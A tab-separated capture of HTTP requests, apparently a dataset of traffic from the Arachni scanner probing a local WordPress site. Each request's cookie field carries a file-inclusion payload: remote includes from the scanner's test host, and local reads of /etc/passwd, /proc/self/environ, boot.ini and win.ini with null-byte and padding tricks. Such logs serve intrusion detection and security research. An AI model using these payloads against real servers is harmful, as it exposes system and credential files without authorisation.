http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6923						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=hTtP://tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6736						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checkhTtP://tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6722						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=http://tests.arachni-scanner.com/rfi.md5.txt	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6952						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checkhttp://tests.arachni-scanner.com/rfi.md5.txt	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6753						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=http://tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6754						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checkhttp://tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6755						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=tests.arachni-scanner.com/rfi.md5.txt	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6918						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checktests.arachni-scanner.com/rfi.md5.txt	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6919						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=tests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6800						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+checktests.arachni-scanner.com/rfi.md5.txt%00	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6916						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/proc/self/environ%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6917						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/proc/self/environ	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6965						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///proc/self/environ%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6966						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///proc/self/environ	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6960						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/etc/passwd%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6953						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/etc/passwd	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6955						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///etc/passwd%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6956						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///etc/passwd	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6909						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/boot.ini%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6915						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/boot.ini	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6957						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///boot.ini%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6958						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///boot.ini	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6961						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=c:/boot.ini%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6963						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=c:/boot.ini	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6964						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://c:/boot.ini%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6967						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://c:/boot.ini	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6801						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/boot.ini............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6802						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/boot.ini............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6803						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///boot.ini............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6804						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///boot.ini............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									7087						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=\boot.ini%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									7074						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=\boot.ini	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									7071						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://\boot.ini%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									7075						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file://\boot.ini	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									7083						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/windows/win.ini%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									7078						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=/windows/win.ini	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									7081						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///windows/win.ini%00.	/web/index.php/2022/01/21/hola-mundo/%22%3E
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									7080						1	http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/%22%3E		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=file:///windows/win.ini	/web/index.php/2022/01/21/hola-mundo/%22%3E
